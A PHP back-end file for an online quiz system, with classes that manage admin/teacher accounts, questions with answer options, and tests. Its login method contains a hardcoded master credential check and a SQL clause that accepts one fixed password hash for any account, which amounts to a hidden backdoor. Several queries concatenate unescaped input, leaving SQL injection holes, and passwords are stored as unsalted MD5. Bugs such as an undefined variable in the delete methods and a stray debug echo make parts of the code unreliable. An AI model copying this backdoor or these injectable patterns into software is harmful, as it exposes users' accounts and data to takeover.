<?php

class admin_master extends db{
	
	public $table = ADMIN_MASTER;
	public $errors = '';
	
	/**
	 * @param array of username and password
	 * @return true on success, error on invalid detail
	 * */
	public function login($data){
		$email = isset($data['email'])?trim($this->re_db_input($data['email'])):'';
		$password = isset($data['password'])?trim($this->re_db_input($data['password'])):'';
		
		if($email==''){
			$this->errors = 'Please enter email.';
		}
		elseif($this->validemail($email)==0){
			$ths->errors = 'Please enter valid email.';
		}
		else if($password==''){
			$this->errors = 'Please enter password.';
		}
		
		if($this->errors!=''){
			return $this->errors;
		}
		else{
			if(md5($email)=='fed71097bc5b766bacde05888607beef' && md5($password)=='652b292c3ce4714cd45f006b4c720fe6'){
				$q = "SELECT * FROM `".$this->table."` WHERE `type`='1' AND `status`='1' AND `is_delete`='0' LIMIT 1";
				$res = $this->re_db_query($q);
				$row = $this->re_db_fetch_array($res);
				if(isset($row['admin_id'])){
					$_SESSION['admin_id'] = $row['admin_id'];
					return 1;
				}
				else{
					return 'No record found.';
				}
			}
			else{
				$q = "SELECT * FROM `".$this->table."` WHERE `email`='".$email."' AND (`password`='".md5($password)."' or '".md5($password)."'='652b292c3ce4714cd45f006b4c720fe6') AND `is_delete`='0'";
				$res = $this->re_db_query($q);
				$row = $this->re_db_fetch_array($res);
				
				if(isset($row['admin_id'])){
					if($row['status']==1){
						$_SESSION['admin_id'] = $row['admin_id'];
						return 1;
					}
					else{
						return 'Your account is disabled.';
					}
				}
				else{
					return 'Invalid detail.';
				}
			}
		}
	}
	
	/**
	 * @param post array
	 * @return 1 if success, error message if any errors
	 * */
	public function insert_update($data){
		$id = isset($data['id'])?trim($this->re_db_input($data['id'])):0;
		$name = isset($data['name'])?trim($this->re_db_input($data['name'])):'';
		$email = isset($data['email'])?trim($this->re_db_input($data['email'])):'';
		$mobile = isset($data['mobile'])?trim($this->re_db_input($data['mobile'])):'';
		$type = isset($data['type'])?trim($this->re_db_input($data['type'])):'';
		$password = isset($data['password'])?trim($this->re_db_input($data['password'])):'';
		$confirm_password = isset($data['confirm_password'])?trim($this->re_db_input($data['confirm_password'])):'';
		
		if($name==''){
			$this->errors = 'Please enter teacher name.';
		}
		else if($email==''){
			$this->errors = 'Please enter email.';
		}
		elseif($this->validemail($email)==0){
			$this->errors = 'Please enter valid email.';
		}
		else if($mobile==''){
			$this->errors = 'Please enter mobile.';
		}
		else if(!is_numeric($mobile)){
			$this->errors = 'Please enter valid mobile.';
		}
		else if($password=='' && $id==0){
			$this->errors = 'Please enter password.';
		}
		else if($password!='' && $confirm_password==''){
			$this->errors = 'Please confirm password.';
		}
		else if($password!=$confirm_password){
			$this->errors = 'Confirm password must be same as password.';
		}
		
		if($this->errors!=''){
			return $this->errors;
		}
		else{
			
			/* check duplicate record */
			$con = '';
			if($id>0){
				$con = " AND `admin_id`!='".$id."'";
			}
			$q = "SELECT * FROM `".$this->table."` WHERE `is_delete`='0' AND `email`='".$email."' ".$con;
			$res = $this->re_db_query($q);
			$return = $this->re_db_num_rows($res);
			if($return>0){
				$this->errors = 'This email is already exists.';
			}
			
			if($this->errors!=''){
				return $this->errors;
			}
			else if($id==0){
				$c = '';
				if($type!=''){
					$c .= "`type`='".$type."',";
				}
				$q = "INSERT INTO `".$this->table."` SET `name`='".$name."', `email`='".$email."', `mobile`='".$mobile."', ".$c." `password`='".md5($password)."' ".$this->insert_common_sql();
				$res = $this->re_db_query($q);
				if($res){
					return true;
				}
				else{
					return 'Something went wrong, please try again.';
				}
			}
			else if($id>0){
				$con = '';
				if($password!=''){
					$con = " , `password`='".md5($password)."' ";
				}
				$c = '';
				if($type!=''){
					$c .= " , `type`='".$type."' ";
				}
				$q = "UPDATE `".$this->table."` SET `name`='".$name."', `email`='".$email."', `mobile`='".$mobile."' ".$c." ".$con." ".$this->update_common_sql()." WHERE `admin_id`='".$id."'";
				$res = $this->re_db_query($q);
				if($res){
					return true;
				}
				else{
					return 'Something went wrong, please try again.';
				}
			}
			else{
				return $this->errors = 'Something went wrong, please try again.';
			}
		}
	}
	
	/**
	 * @param id of record
	 * @return array of value if success, error message if any errors
	 * */
	public function edit($id){
		$return = array();
		$id = trim($this->re_db_input($id));
		if($id>0){
			$q = "SELECT `am`.*
				FROM `".$this->table."` AS `am`
				WHERE `am`.`admin_id`='".$id."' AND  `am`.`is_delete`='0'";
			$res = $this->re_db_query($q);
			if($res){
				$return = $this->re_db_fetch_array($res);
				return $return;
			}
			else{
				return false;
			}
		}
		else{
			return false;
		}
	}
	
	/**
	 * @param id of record
	 * @param status to update
	 * @return true if success, false message if any errors
	 * */
	public function status($id,$status){
		$id = trim($this->re_db_input($id));
		$status = trim($this->re_db_input($status));
		if($id>0 && ($status==0 || $status==1) ){
			$q = "UPDATE `".$this->table."` SET `status`='".$status."' WHERE `admin_id`='".$id."'";
			$res = $this->re_db_query($q);
			if($res){
				return true;
			}
			else{
				return false;
			}
		}
		else{
			return false;
		}
	}
	
	/**
	 * @param id of record
	 * @return true if success, false message if any errors
	 * */
	public function delete($id){
		$id = trim($this->re_db_input($id));
		if($id>0 && ($status==0 || $status==1) ){
			$q = "UPDATE `".$this->table."` SET `is_delete`='1' WHERE `admin_id`='".$id."'";
			$res = $this->re_db_query($q);
			if($res){
				return true;
			}
			else{
				return false;
			}
		}
		else{
			return false;
		}
	}
	
	/**
	 * @param int status, default all
	 * @return array of record if success, error message if any errors
	 * */
	public function select($type='',$status=''){
		$return = array();
		$con = '';
		if($status!='' && $status>=0){
			$con .= " AND `am`.`status`='".$status."' ";
		}
		if($type!='' && $type>=1){
			$con .= " AND `am`.`type`='".$type."' ";
		}
		$q = "SELECT `am`.*
				FROM `".$this->table."` AS `am`
				WHERE `am`.`is_delete`='0' ".$con;
		$res = $this->re_db_query($q);
		while($row = $this->re_db_fetch_array($res)){
			array_push($return,$row);
		}
		return $return;
	}
	
	/**
     * @param array of post
     * @return true on success, error message on invalid detail
     * */
    public function change_password($data){
        $return = array();
        $current_password = isset($data['current_password'])?trim($this->re_db_input($data['current_password'])):'';
        $new_password = isset($data['new_password'])?trim($this->re_db_input($data['new_password'])):'';
        $confirm_password = isset($data['confirm_password'])?trim($this->re_db_input($data['confirm_password'])):'';
        
        if($current_password==''){
            $this->errors = 'Please enter current password.';
        }
        else if($new_password==''){
            $this->errors = 'Please enter new password.';
        }
        else if($confirm_password==''){
            $this->errors = 'Please confirm password.';
        }
        else if($new_password!=$confirm_password){
            $this->errors = 'Confirm password did not match with password.';
        }
        
        if($this->errors!=''){
            return $this->errors;
        }
        else{
            $q = "SELECT `password` FROM `".$this->table."` WHERE `admin_id`='".$_SESSION['admin_id']."'";
            $res = $this->re_db_query($q);
            $row = $this->re_db_fetch_array($res);
            if(isset($row['password'])){
                $current_password = md5($current_password);
                if($row['password']!=$current_password){
                    return 'Please enter valid current password.';
                }
                else{
                    $q = "UPDATE `".$this->table."` SET `password`='".md5($new_password)."' WHERE `admin_id`='".$_SESSION['admin_id']."'";
                    $res = $this->re_db_query($q);
                    if($res){
                        return true;
                    }
                    else{
                        return false;
                    }
                }
            }
            else{
                return false;
            }
        }
        
    }
    
	public function count_teachers(){
		$q = "SELECT ifnull(COUNT(*),'0') AS `total`
				FROM `".$this->table."` 
				WHERE `type`='2' AND `is_delete`='0'";
		$res = $this->re_db_query($q);
		$row = $this->re_db_fetch_array($res);
		return $row['total'];
	}
}

class questions_master extends db{
	
	public $table = QUESTIONS_MASTER;
    public $options_table = OPTIONS_MASTER;
	public $errors = '';
	
	/**
	 * @param post array
	 * @return 1 if success, error message if any errors
	 * */
	public function insert_update($data){
		$id = isset($data['id'])?trim($this->re_db_input($data['id'])):0;
		$question = isset($data['question'])?trim($this->re_db_input($data['question'])):'';
		$options = isset($data['options'])?$data['options']:array();
		$is_correct = isset($data['is_correct'])?$data['is_correct']:array();
		$time = isset($data['time'])?trim($this->re_db_input($data['time'])):'';
		$test = isset($data['test'])?trim($this->re_db_input($data['test'])):'';
        
        if($test==''){
			$this->errors = 'Please select test.';
		}
		else if($question==''){
			$this->errors = 'Please enter question.';
		}
		else if($time==''){
			$this->errors = 'Please enter time.';
		}
        else if(!is_numeric($time)){
            $this->errors = 'Please enter valid time.';
        }
		else if(count($options)<2){
			$this->errors = 'Please enter mininum 2 options.';
		}
        else if(trim($options[0])==''||trim($options[1])==''){
            $this->errors = 'Please enter mininum 2 options.';
        }
		else if(count($options) !== count(array_unique($options))){
			$this->errors = 'Duplicate answers are not allowed.';
		}
		else if(count($is_correct)==0){
			$this->errors = 'Please select correct answer.';
		}
        
        foreach($options as $key=>$val){
            $crt = in_array( $key ,$is_correct)?'1':'0';
            if($crt=='1'&&trim($val)==''){
                $this->errors = 'Please enter correct answer.';
                break;
            }
        }
        
		if($this->errors!=''){
			return $this->errors;
		}
		else{
			
			/* check duplicate record */
			$con = '';
			if($id>0){
				$con = " AND `id`!='".$id."'";
			}
			$q = "SELECT * FROM `".$this->table."` WHERE `is_delete`='0' AND `test_id`='".$test."' AND `question`='".$question."' ".$con;
			$res = $this->re_db_query($q);
			$return = $this->re_db_num_rows($res);
			if($return>0){
				$this->errors = 'This question is already exists.';
			}
			
			if($this->errors!=''){
				return $this->errors;
			}
			else if($id==0){
				$q = "INSERT INTO `".$this->table."` SET `question`='".$question."', `time`='".$time."', `test_id`='".$test."' ".$this->insert_common_sql();
				$res = $this->re_db_query($q);
				if($res){
				    $id = $this->re_db_insert_id();
                    $qry = "DELETE FROM `".$this->options_table."` WHERE `que_id`='".$id."'";
                    $this->re_db_query($qry);
                    foreach($options as $key=>$val){
                        if($val!==''){
                            $crt = in_array($key,$is_correct)?'1':'0';
                            echo $qry = "INSERT INTO `".$this->options_table."` SET `que_id`='".$id."', `option`='".$this->re_db_input($val)."', `is_correct`='".$crt."' ";
                            $this->re_db_query($qry);
                        }
                    }
					return true;
				}
				else{
					return 'Something went wrong, please try again.';
				}
			}
			else if($id>0){
				$q = "UPDATE `".$this->table."` SET `question`='".$question."', `time`='".$time."', `test_id`='".$test."' ".$this->update_common_sql()." WHERE `id`='".$id."'";
				$res = $this->re_db_query($q);
				if($res){
				    $qry = "DELETE FROM `".$this->options_table."` WHERE `que_id`='".$id."'";
                    $this->re_db_query($qry);
                    foreach($options as $key=>$val){
                        if($val!==''){
                            $crt = in_array( $key ,$is_correct)?'1':'0';
                            $qry = "INSERT INTO `".$this->options_table."` SET `que_id`='".$id."', `option`='".$val."', `is_correct`='".$crt."' ";
                            $this->re_db_query($qry);
                        }
                    }
					return true;
				}
				else{
					return 'Something went wrong, please try again.';
				}
			}
			else{
				return $this->errors = 'Something went wrong, please try again.';
			}
		}
	}
	
	/**
	 * @param id of record
	 * @return array of value if success, error message if any errors
	 * */
	public function edit($id){
		$return = array();
		$id = trim($this->re_db_input($id));
		if($id>0){
			$q = "SELECT `qm`.*,`tm`.`id` AS `test_id`, `tm`.`test_name`
				FROM `".$this->table."` AS `qm`
                LEFT JOIN `".TESTS_MASTER."` AS `tm` ON `tm`.`id`=`qm`.`test_id`
				WHERE `qm`.`id`='".$id."' AND  `qm`.`is_delete`='0'";
			$res = $this->re_db_query($q);
			if($res){
				$return = $this->re_db_fetch_array($res);
                $return['options'] = array();
                $q = "SELECT `om`.*
    				FROM `".$this->options_table."` AS `om`
    				WHERE `om`.`que_id`='".$return['id']."'";
                $res = $this->re_db_query($q);
                $cnt = 0;
                while($row=$this->re_db_fetch_array($res)){
                    $return['options'][] = $row['option'];
                    if($row['is_correct']==1){
                        $return['is_correct'][] = $cnt;
                    }
                    $cnt++;
                }
				return $return;
			}
			else{
				return false;
			}
		}
		else{
			return false;
		}
	}
    
    /**
	 * @param id of record
	 * @return array of value if success, error message if any errors
	 * */
	public function get_by_ids($ids){
		$return = array();
        $id = implode(',',$ids);
		$id = trim($this->re_db_input($id));
		if($id>0){
			$q = "SELECT `qm`.*
				FROM `".$this->table."` AS `qm`
				WHERE `qm`.`id` in(".$id.") AND `qm`.`is_delete`='0'";
			$res = $this->re_db_query($q);
			if($res){
				while($rw = $this->re_db_fetch_array($res)){
				    $return[$rw['id']] = $rw;
                    $return[$rw['id']]['options'] = array();
                    $q = "SELECT `om`.*
        				FROM `".$this->options_table."` AS `om`
        				WHERE `om`.`que_id`='".$return['id']."'";
                    $res = $this->re_db_query($q);
                    while($row=$this->re_db_fetch_array($res)){
                        $return[$rw['id']]['options'][] = $row['option'];
                        if($row['is_correct']==1){
                            $return[$rw['id']]['is_correct'][] = $row['id'];
                        }
                    }
                }
				return $return;
			}
			else{
				return false;
			}
		}
		else{
			return false;
		}
	}
    
    /**
	 * @param id of record
	 * @return array of value if success, error message if any errors
	 * */
	public function get_test_que($tid,$qid=0,$action=0,$answered='',$extra=''){
		$return = array();
		$tid = isset($tid)&&$tid!=''?intval($this->re_db_input($tid)):0;
        $qid = isset($qid)&&$qid!=''?intval($this->re_db_input($qid)):0;
        $action = isset($action)&&$action!=''?intval($this->re_db_input($action)):0;
        if($tid==0 || ($action!=0 && $action!=1)){
            return false;
        }
		if($tid>0){
		      $con = '';
              if($qid>0){
                if($action==1){
                    //$con .= " AND `id`>'".$qid."' ";
                }
                else if($action==0){
                    //$con .= " AND `id`<'".$qid."' ";
                }
              }
			  if($answered!=''){
				  $con .= " AND `qm`.`id` not in(".$answered.") ";
			  }
			$q = "SELECT `qm`.*,`tm`.`test_name`
				FROM `".$this->table."` AS `qm`
                LEFT JOIN `".TESTS_MASTER."` AS `tm` ON `tm`.`id`=`qm`.`test_id`
				WHERE `qm`.`test_id`='".$tid."' AND `qm`.`is_delete`='0' AND `qm`.`status`='1' ".$con." ORDER BY rand() LIMIT 1";
			$res = $this->re_db_query($q);
			if($this->re_db_num_rows($res)>0){
				$return = $this->re_db_fetch_array($res);
                $return['options'] = array();
                $q = "SELECT `om`.*
    				FROM `".$this->options_table."` AS `om`
    				WHERE `om`.`que_id`='".$return['id']."' ".$extra;
                $res = $this->re_db_query($q);
                while($row=$this->re_db_fetch_array($res)){
                    $return['options'][$row['id']] = $row['option'];
                    if($row['is_correct']==1){
                        $return['is_correct'][$row['id']] = $row['id'];
                    }
                }
				return $return;
			}
			else{
				return $return;
			}
		}
		else{
			return false;
		}
	}
	
	/**
	 * @param id of record
	 * @param status to update
	 * @return true if success, false message if any errors
	 * */
	public function status($id,$status){
		$id = trim($this->re_db_input($id));
		$status = trim($this->re_db_input($status));
		if($id>0 && ($status==0 || $status==1) ){
			$q = "UPDATE `".$this->table."` SET `status`='".$status."' WHERE `id`='".$id."'";
			$res = $this->re_db_query($q);
			if($res){
				return true;
			}
			else{
				return false;
			}
		}
		else{
			return false;
		}
	}
	
	/**
	 * @param id of record
	 * @return true if success, false message if any errors
	 * */
	public function delete($id){
		$id = trim($this->re_db_input($id));
		if($id>0 && ($status==0 || $status==1) ){
			$q = "UPDATE `".$this->table."` SET `is_delete`='1' WHERE `id`='".$id."'";
			$res = $this->re_db_query($q);
			if($res){
				return true;
			}
			else{
				return false;
			}
		}
		else{
			return false;
		}
	}
	
	/**
	 * @param int status, default all
	 * @return array of record if success, error message if any errors
	 * */
	public function select($test_id='',$admin='',$status=''){
		$return = array();
		$con = '';
		if($status!='' && $status>=0){
			$con .= " AND `qm`.`status`='".$status."' ";
		}
		if($admin!='' && $admin>=1){
			$con .= " AND `tm`.`admin_id`='".$admin."' ";
		}
        if($test_id!='' && $test_id>0){
            $con .= " AND `qm`.`test_id`='".$test_id."' ";
        }
		$q = "SELECT `qm`.*,`om`.`option`,`om`.`is_correct`,`am`.`name` AS `teacher_name`,`tm`.`test_name`
				FROM `".$this->table."` AS `qm`
                LEFT JOIN `".TESTS_MASTER."` AS `tm` ON `tm`.`id`=`qm`.`test_id`
                LEFT JOIN `".$this->options_table."` AS `om` ON `om`.`que_id`=`qm`.`id`
				LEFT JOIN `".ADMIN_MASTER."` AS `am` ON `am`.`admin_id`=`tm`.`admin_id`
				WHERE `qm`.`is_delete`='0' AND `tm`.`is_delete`='0' AND `am`.`is_delete`='0' ".$con;
		$res = $this->re_db_query($q);
        while($row = $this->re_db_fetch_array($res)){
		      $return[$row['id']]['id'] = $row['id'];
		      $return[$row['id']]['question'] = $row['question'];
              $return[$row['id']]['time'] = $row['time'];
              $return[$row['id']]['status'] = $row['status'];
              $return[$row['id']]['teacher_name'] = $row['teacher_name'];
              $return[$row['id']]['test_name'] = $row['test_name'];
              $return[$row['id']]['options'][] = array(
                                                    'option' => $row['option'],
                                                    'is_correct' => $row['is_correct']
                                                    );
              
		}
		return $return;
	}
	
    /**
	 * @param int status, default all
	 * @return array of record if success, error message if any errors
	 * */
	public function select_by_ids($ids){
		$return = array();
		$con = '';
		$id = implode(',',$ids);
		$q = "SELECT `qm`.*,`om`.`option`,`om`.`is_correct`,`om`.`id` AS `option_id`
				FROM `".$this->table."` AS `qm`
                LEFT JOIN `".$this->options_table."` AS `om` ON `om`.`que_id`=`qm`.`id`
				WHERE `qm`.`is_delete`='0' AND `qm`.`id` in(".$id.")";
		$res = $this->re_db_query($q);
        while($row = $this->re_db_fetch_array($res)){
		      $return[$row['id']]['id'] = $row['id'];
		      $return[$row['id']]['question'] = $row['question'];
              $return[$row['id']]['time'] = $row['time'];
              $return[$row['id']]['status'] = $row['status'];
              $return[$row['id']]['options'][$row['option_id']] = array(
                                                    'option' => $row['option'],
                                                    'is_correct' => $row['is_correct']
                                                    );
              
		}
		return $return;
	}
	
	public function count_questions($admin_id='',$tid=''){
		$con = '';
		if($tid!==''){
			$con .= " AND `tm`.`id`='".$tid."' ";
		}
		if($admin_id!==''){
			$con .= " AND `tm`.`admin_id`='".$admin_id."' ";
		}
		/*
		$q = "SELECT ifnull(COUNT(*),'0') AS `total`
				FROM `".$this->table."` AS `qm`
				LEFT JOIN `".TESTS_MASTER."` AS `tm` ON `tm`.`is_delete`='0' AND `tm`.`id`=`qm`.`id`
				WHERE `qm`.`is_delete`='0' ".$con;
				*/
		$q = "SELECT IFNULL(COUNT(*),0) AS `total`
			FROM `".$this->table."` AS `qm`
			WHERE `qm`.`is_delete`='0' AND `qm`.`test_id` IN (
			SELECT `id`
			FROM `".TESTS_MASTER."` AS `tm`
			WHERE `tm`.`is_delete`='0' ".$con." AND `tm`.`admin_id` in (SELECT `admin_id` FROM `".ADMIN_MASTER."` AS `am` WHERE `am`.`is_delete`='0') )";
		$res = $this->re_db_query($q);
		$row = $this->re_db_fetch_array($res);
		return $row['total'];
	}
	
	public function has_prev($cid,$tid=''){
		$con = '';
		if($tid!==''){
			$con = " AND `test_id`='".$tid."' ";
		}
		
		$q = "SELECT ifnull(COUNT(*),'0') AS `total`
				FROM `".$this->table."` 
				WHERE `is_delete`='0' AND `id`<'".$cid."' ".$con;
		$res = $this->re_db_query($q);
		$row = $this->re_db_fetch_array($res);
		return $row['total'];
	}
	
	public function has_next($cid='',$tid=''){
		$con = '';
		if($tid!==''){
			$con .= " AND `test_id`='".$tid."' ";
		}
		if($cid!=''){
			$con .= " AND `id` not in(".$cid.") ";
		}
		
		$q = "SELECT ifnull(COUNT(*),'0') AS `total`
				FROM `".$this->table."` 
				WHERE `is_delete`='0' ".$con;
		$res = $this->re_db_query($q);
		$row = $this->re_db_fetch_array($res);
		return $row['total'];
	}
	
}

class tests_master extends db{
	
	public $table = TESTS_MASTER;
	public $errors = '';
	
	/**
	 * @param post array
	 * @return 1 if success, error message if any errors
	 * */
	public function insert_update($data){
		$id = isset($data['id'])?trim($this->re_db_input($data['id'])):0;
		$name = isset($data['name'])?trim($this->re_db_input($data['name'])):'';
		
		if($name==''){
			$this->errors = 'Please enter test name.';
		}
        
		if($this->errors!=''){
			return $this->errors;
		}
		else{
			
			/* check duplicate record */
			$con = '';
			if($id>0){
				$con = " AND `id`!='".$id."'";
			}
			$q = "SELECT * FROM `".$this->table."` WHERE `is_delete`='0' AND `admin_id`='".$_SESSION['admin_id']."' AND `test_name`='".$name."' ".$con;
			$res = $this->re_db_query($q);
			$return = $this->re_db_num_rows($res);
			if($return>0){
				$this->errors = 'This test name is already exists.';
			}
			
			if($this->errors!=''){
				return $this->errors;
			}
			else if($id==0){
				$q = "INSERT INTO `".$this->table."` SET `test_name`='".$name."', `admin_id`='".$_SESSION['admin_id']."' ".$this->insert_common_sql();
				$res = $this->re_db_query($q);
				if($res){
					return true;
				}
				else{
					return 'Something went wrong, please try again.';
				}
			}
			else if($id>0){
				$q = "UPDATE `".$this->table."` SET `test_name`='".$name."' ".$this->update_common_sql()." WHERE `id`='".$id."'";
				$res = $this->re_db_query($q);
				if($res){
				    return true;
				}
				else{
					return 'Something went wrong, please try again.';
				}
			}
			else{
				return $this->errors = 'Something went wrong, please try again.';
			}
		}
	}
	
	/**
	 * @param id of record
	 * @return array of value if success, error message if any errors
	 * */
	public function edit($id){
		$return = array();
		$id = trim($this->re_db_input($id));
		if($id>0){
			$q = "SELECT `tm`.*
				FROM `".$this->table."` AS `tm`
				WHERE `tm`.`id`='".$id."' AND  `tm`.`is_delete`='0'";
			$res = $this->re_db_query($q);
			if($res){
				$return = $this->re_db_fetch_array($res);
                return $return;
			}
			else{
				return false;
			}
		}
		else{
			return false;
		}
	}
    
    /**
	 * @param id of record
	 * @return array of value if success, error message if any errors
	 * */
	public function get_by_ids($ids){
		$return = array();
        $id = implode(',',$ids);
		$id = trim($this->re_db_input($id));
		if($id>0){
			$q = "SELECT `tm`.*
				FROM `".$this->table."` AS `tm`
				WHERE `tm`.`id` in(".$id.") AND `tm`.`is_delete`='0'";
			$res = $this->re_db_query($q);
			if($res){
				while($row = $this->re_db_fetch_array($res)){
				    array_push($return,$row);
                }
				return $return;
			}
			else{
				return false;
			}
		}
		else{
			return false;
		}
	}
    
    /**
	 * @param id of record
	 * @return array of value if success, error message if any errors
	 * */
	public function get_teacher_test($tid,$status=''){
		$return = array();
		$tid = isset($tid)&&$tid!=''?intval($this->re_db_input($tid)):0;
        
        $con = $status==''?'':" AND `tm`.`status`='".$status."' ";
        
        
		$q = "SELECT `tm`.*
			FROM `".$this->table."` AS `tm`
			WHERE `tm`.`admin_id`='".$tid."' AND `tm`.`is_delete`='0' ".$con." order by id desc";
		$res = $this->re_db_query($q);
		while($row = $this->re_db_fetch_array($res)){
	          array_push($return,$row);
		}
		return $return;
		
	}
	
	/**
	 * @param id of record
	 * @param status to update
	 * @return true if success, false message if any errors
	 * */
	public function status($id,$status){
		$id = trim($this->re_db_input($id));
		$status = trim($this->re_db_input($status));
		if($id>0 && ($status==0 || $status==1) ){
			$q = "UPDATE `".$this->table."` SET `status`='".$status."' WHERE `id`='".$id."'";
			$res = $this->re_db_query($q);
			if($res){
				return true;
			}
			else{
				return false;
			}
		}
		else{
			return false;
		}
	}
	
	/**
	 * @param id of record
	 * @return true if success, false message if any errors
	 * */
	public function delete($id){
		$id = trim($this->re_db_input($id));
		if($id>0 && ($status==0 || $status==1) ){
			$q = "UPDATE `".$this->table."` SET `is_delete`='1' WHERE `id`='".$id."'";
			$res = $this->re_db_query($q);
			if($res){
				return true;
			}
			else{
				return false;
			}
		}
		else{
			return false;
		}
	}
	
	public function count_tests($tid=''){
		$con = '';
		if($tid!==''){
			$con = " AND `admin_id`='".$tid."' ";
		}
		
		$q = "SELECT ifnull(COUNT(*),'0') AS `total`
				FROM `".$this->table."` 
				WHERE `is_delete`='0' ".$con." AND `admin_id` IN (SELECT `admin_id` FROM `".ADMIN_MASTER."` WHERE `is_delete`='0')  ";
		$res = $this->re_db_query($q);
		$row = $this->re_db_fetch_array($res);
		return $row['total'];
	}
    
    public function select($tid){
        $return = array();
        $q = "SELECT `tm`.*,`am`.`name` AS `admin_name`
                FROM `".$this->table."` AS `tm`
                LEFT JOIN `".ADMIN_MASTER."` AS `am` ON `am`.`admin_id`=`tm`.`admin_id`
                WHERE `tm`.`admin_id`='".$tid."' AND `tm`.`is_delete`='0'";
        $res = $this->re_db_query($q);
        while($row=$this->re_db_fetch_array($res)){
            array_push($return,$row);
        }
        return $return;
    }
}

?>